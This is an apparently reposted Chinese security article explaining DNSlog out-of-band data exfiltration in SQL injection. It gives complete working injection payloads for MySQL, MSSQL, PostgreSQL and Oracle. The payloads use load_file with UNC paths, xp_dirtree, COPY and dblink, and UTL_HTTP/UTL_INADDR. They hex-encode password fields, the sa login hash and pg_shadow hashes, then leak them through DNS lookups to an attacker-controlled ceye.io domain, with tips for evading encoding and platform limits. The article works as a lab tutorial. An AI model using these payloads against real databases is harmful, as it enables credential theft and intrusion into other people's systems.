http://netsecurity.51cto.com/art/201802/566391.htm

## Dnslog在SQL注入中的实战

本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。

- 作者：佚名来源：[安全客](https://www.anquanke.com/post/id/98096)|*2018-02-10 09:44*

                   	                 		[ 收藏](javascript:favorBox('open');)                 	 					 						[  分享](javascript:;) 					                 

本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。然而在实际的运用中，因为环境的差异，利用也不同。本文详细的记录了在多种常见数据库实际运用过程的一些细节，包括POC的编写和原理，和一些网上没有公开的利用POC。

[![Dnslog在SQL注入中的实战](http://s3.51cto.com/oss/201802/10/e3543fac3b4ab5cb67f986a6cb666870.jpg-wh_651x-s_2442292045.jpg)](http://s3.51cto.com/oss/201802/10/e3543fac3b4ab5cb67f986a6cb666870.jpg-wh_651x-s_2442292045.jpg)

**一、关于DNSlog在Web攻击的利用**

DNSlog在Web漏洞利用中已经是老生常谈的问题，简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过这种方式把想获得的数据外带出来。

**二、常用在哪些情况下**

- SQL注入中的盲注
- 无回显的命令执行
- 无回显的SSRF

**三、Dnslog攻击的基本原理**

[![Dnslog攻击的基本原理](http://s1.51cto.com/oss/201802/10/a774db841e7b859872e4e1c1f3b18a7d.jpg)](http://s1.51cto.com/oss/201802/10/a774db841e7b859872e4e1c1f3b18a7d.jpg)

如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。

**四、Dnslog在常见数据库中SQL注入的实战**

这里主要列举了4种数据库，MySQL、MSSQL、PostgreSQL、Oracle。

本次演示一个最常见的注入场景，就是WHERE后面条件处的注入。实验环境有一个test_user表，三个字段id、user、pass。如下

[![img](http://s1.51cto.com/oss/201802/10/eaf0a041a784dcf6bbfb784d663dacc1.jpg)](http://s1.51cto.com/oss/201802/10/eaf0a041a784dcf6bbfb784d663dacc1.jpg)

最后想要达到的目的是通过DNS外带的方式查询到pass字段的内容。

此处就不再自己搭建一个DNS服务器了，直接用ceye.io这个平台吧，这个平台就集成了Dnslog的功能。

**1. MySQL**

(1) load_file

MySQL应该是在实战中利用Dnslog最多的，所以先来说说它吧。

在MySQL中有个一个load_file函数可以用来读取本地的文件。

```
http://127.0.0.1/mysql.php?id=1 union select 1,2,load_file(CONCAT('\\',(SELECT hex(pass)  FROM test.test_user WHERE name='admin' LIMIT 1),'.mysql.nk40ci.ceye.io\abc')) 
```

[![img](http://s5.51cto.com/oss/201802/10/aa1ac7f2cd91863586cb2c8e7bada0e6.jpg)](http://s5.51cto.com/oss/201802/10/aa1ac7f2cd91863586cb2c8e7bada0e6.jpg)

可以看到test_user中的pass字段的值的Hex码就被查询出来了，为什么这个地方Hex编码的目的就是减少干扰，因为很多事数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的。

注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。

(2) UNC路径

以下是百度的UNC路径的解释

其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式

```
\\sss.xxx\test\ 
```

这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。

```
tips： 
```

因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的

**2. msSQL**

(1) 先看看网上流传最多的POC：

```
DECLARE @host varchar(1024);  SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';  EXEC('master..xp_dirtree"\'+@host+'\foobar$"'); 
```

这个POC在数据库控制台执行的确是可以得到数据库中sa用户Hex编码之后的Hash的。但是实际要获得我们的test_user的表中的数据的时候，对POC需要一定的加工。

首先在sqlserver中字段名是不能和自定义函数名字冲突的，如果冲突需要用[]将字段包裹起来，如下图:

[![img](http://s3.51cto.com/oss/201802/10/3f778d6d91c2580e6dba6d441ca49351.jpg)](http://s3.51cto.com/oss/201802/10/3f778d6d91c2580e6dba6d441ca49351.jpg)

这里的user字段正好和系统的user()函数同名，所以字段需要[]包裹。

开始和域名拼接，发生如下图的情况

[![img](http://s1.51cto.com/oss/201802/10/4bbc14cd0c0018d7f07381ab989fa976.jpg)](http://s1.51cto.com/oss/201802/10/4bbc14cd0c0018d7f07381ab989fa976.jpg)

然后发现拼接起来的字符串有空格，这是因为在sqlserver中当需要字符串拼接的时候，如果字段的值的长度没有达到表结构字段的长度，就会用空格来填充

[![img](http://s5.51cto.com/oss/201802/10/4d0dc1f81d19d9ecfc2e4b24b54a5c33.jpg)](http://s5.51cto.com/oss/201802/10/4d0dc1f81d19d9ecfc2e4b24b54a5c33.jpg)

这里我的pass字段设置的长度是50，所但是值实际的长度是8，之所以剩余的长度就用空格填充了。这个时候就用想办法去掉空格，查阅手册可以发现rtrim函数是可以去除右边空格的，如下图

[![img](http://s2.51cto.com/oss/201802/10/46536106ec0d08215716b2481a24ecf0.jpg)](http://s2.51cto.com/oss/201802/10/46536106ec0d08215716b2481a24ecf0.jpg)

开始编码，前面说过域名是不能带有些特殊字符的，所以我们最好能将查询出来的值编码之后再和域名进行拼接，但是在查阅了sqlserver的手册之后，没有发现可以直接对字符类型进行编码的函数，只有将2进制转换成Hex的函数，所以这里我需要先将字符类型强制转换成varbinary二进制类型，然后再将二进制转化成Hex编码之后的字符类型。先转换成二进制

[![img](http://s1.51cto.com/oss/201802/10/b54d0cafdb9c1fec4c0bac6f5bd7701a.png)](http://s1.51cto.com/oss/201802/10/b54d0cafdb9c1fec4c0bac6f5bd7701a.png)

再把二进制转换成字符类型的Hex编码

[![img](http://s3.51cto.com/oss/201802/10/beaa7753e2223b5f566d2192dbcc1e27.png)](http://s3.51cto.com/oss/201802/10/beaa7753e2223b5f566d2192dbcc1e27.png)

最后完整的POC就是出来了。

```
http://127.0.0.1/mssql.php?id=1; DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass)))  FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io'; EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"'); 
```

结果如下：

[![img](http://s1.51cto.com/oss/201802/10/465a1e32470b3be60be542d53e2eb5f6.png)](http://s1.51cto.com/oss/201802/10/465a1e32470b3be60be542d53e2eb5f6.png)

那为什么网上给的那个POC就是能够获取到sa用户的hash之后的hex码的呢，原因如下:

![img](http://s3.51cto.com/oss/201802/10/d5a82c2bfddbd053c08fd9b3074605a4.jpeg)

因为那个hash字段本来就是二进制类型，所以不需要在经过类型转换了。

tips：此处有个小问题，因为拼接用到了+号，+号在url中如果不url编码到代码层的时候就成空格了，所以我们需要在提交之前对+号url编码下

(2) SQLServer中其他的一些可使用函数

```
master..xp_fileexist master..xp_subdirs 
```

这两个用法和前面的用法基本一样，不再赘述。

```
OpenRowset() OpenDatasource() 
```

这两个都是加载远程数据库的函数。

这个两个函数都需要高权限，而且系统是默认关闭的，需要通过sp_configure去配置高级选项开启功能，开启代码如下：

```
exec sp_configure 'show advanced options',1；  reconfigure；  exec sp_configure 'Ad Hoc Distributed Queries',1；  reconfigure； 
```

所以此处不推荐使用这两个函数，不仅权限要求高而且使用起来也太麻烦，前面三已经够用了。

**3. postgreSQL**

大多数的脚本语言对于PostgreSQL都是支持SQL语句多语句的执行的所以此处就非常方便了，我们可以编写一个自定义的函数和存储过程就好了，和SQLServer类似。1)copy函数的定义

```
COPY tablename [ ( column [, ...] ) ]  FROM { 'filename' | STDIN } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] CSV [ QUOTE [ AS ] 'quote' 'escape' ]  [ FORCE NOT NULL column [, ...] ]  COPY tablename [ ( column [, ...] ) ] TO { 'filename' | STDOUT } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ]  CSV [ QUOTE [ AS ] 'quote' 'escape' ] [ FORCE QUOTEcolumn [, ...] ] 
```

从定义看出这里是无法嵌套查询，它这里需要直接填入文件名，所以过程就麻烦一点。

这是网上的POC，整体上没有什么问题。

```
DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT; DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres'); exec_cmd := E'COPY table_output(content)FROM E\'\\\\'||query_result||E'.postgreSQL.nk40ci.ceye.io\\foobar.txt\''; EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function(); 
```

只是需要对数据处理编一下码，此处会用到encode函数，如下

```
encode(pass::bytea,’hex’) 
```

最后完整的POC如下：

```
http://127.0.0.1/pgSQL.php?id=1;DROP TABLE IF EXISTS table_output;  CREATE TABLE table_output(content text);  CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;  DECLARE query_result TEXT;  BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);  exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';     EXECUTE exec_cmd;  END; $$ LANGUAGE plpgSQL SECURITY DEFINER;  SELECT temp_function(); 
```

结果：

[![img](http://s5.51cto.com/oss/201802/10/66c0dbecddeba0fca068669ab21e3e75.png)](http://s5.51cto.com/oss/201802/10/66c0dbecddeba0fca068669ab21e3e75.png)

tips：因为这里的copy需要的参数是文件路径，所以这里其实也是利用了UNC路径，因此这个方式也只能在windows下使用

(2) db_link扩展

db_link是PostreSQL用来连接其他的数据库的扩展，用法也很简单，而且可以嵌套子查询，那就很方便了

```
dblink('连接串', 'SQL语句') 
```

```
http://127.0.0.1/pgsql.php?id=1;CREATE EXTENSION dblink;  SELECT * FROM dblink('host='||(select encode(pass::bytea,'hex') from test_user where id =1)||'.vvv.psql.3.nk40ci.ceye.io user=someuser dbname=somedb',  'SELECT version()') RETURNS (result TEXT); 
```

CREATE EXTENSION dblink; 就是打开这个扩展，因为这个扩展默认是关闭的。

[![img](http://s2.51cto.com/oss/201802/10/e2942210be52182c17200251e526e538.jpg)](http://s2.51cto.com/oss/201802/10/e2942210be52182c17200251e526e538.jpg)

tips：

- 在Ubuntu测试的时候dblink扩展不是默认安装的，需要自己安装扩展。
- Windows下是默认虽然有扩展的，但是默认是不开启的，需要打开扩展。

**4. Oracle**

Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。

这里就列举几个吧。

UTL_HTTP.REQUEST

```
select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL; 
```

[![img](http://s5.51cto.com/oss/201802/10/0f404b42740140e9f1ee84b497964fe7.jpg)](http://s5.51cto.com/oss/201802/10/0f404b42740140e9f1ee84b497964fe7.jpg)

[![img](http://s1.51cto.com/oss/201802/10/54b1c75cce4c77b8b9db813c83984aae.png)](http://s1.51cto.com/oss/201802/10/54b1c75cce4c77b8b9db813c83984aae.png)

DBMS_LDAP.INIT

```
select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL; 
```

HTTPURITYPE

```
select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL; 
```

UTL_INADDR.GET_HOST_ADDRESS

```
select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL;  
```

tips：oracle是不允许select语句后面没有表的，所以此处可以跟一个伪表dual

Oracle其他一些能够发起网络请求的模块：

```
UTL_HTTP  UTL_TCP  UTL_SMPTP  UTL_URL 
```

**五、总结**

- 有些函数的使用操作系统的限制。
- dns查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。
- 避免一些特殊符号的产生，最好的选择就是数据先编码再带出。
- 注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。
- 有些操作是需要较高的权限。